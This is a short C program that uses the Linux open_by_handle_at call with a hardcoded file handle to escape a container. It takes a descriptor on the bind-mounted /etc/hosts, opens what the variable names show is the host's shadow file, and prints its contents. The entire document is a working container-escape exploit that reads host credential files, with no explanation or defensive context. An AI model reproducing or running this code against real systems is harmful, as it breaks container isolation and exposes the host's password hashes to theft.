#define _GNU_SOURCE
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void die(const char *msg)
{
	perror(msg);
	exit(errno);
}

int main(){
	char read_buf[0x1000];
	struct file_handle *fhp;
	int handle_bytes = 8;
	char f_handle[8] = {0x25, 0x18, 0x01, 0x00, 0xc6, 0xfd, 0xc8,0x4d};
	int fd_hosts,fd_host_shadow;
	fhp = malloc(sizeof(struct file_handle) + handle_bytes);
	fhp->handle_bytes = handle_bytes;
	fhp->handle_type = 1;
	memcpy(fhp->f_handle,f_handle,8);
	if ((fd_hosts = open("/etc/hosts", O_RDONLY)) < 0)
		die("[-] open");
	fd_host_shadow = open_by_handle_at(fd_hosts, fhp, O_RDONLY);
	if(fd_host_shadow < 0){
		die("[-] open host shadow");
	}
	memset(read_buf,0,sizeof(read_buf));
	if (read(fd_host_shadow, read_buf, sizeof(read_buf) - 1) < 0)
		die("[-] read");
	printf("fd_host_shadow file content is \n%s ",read_buf);

}
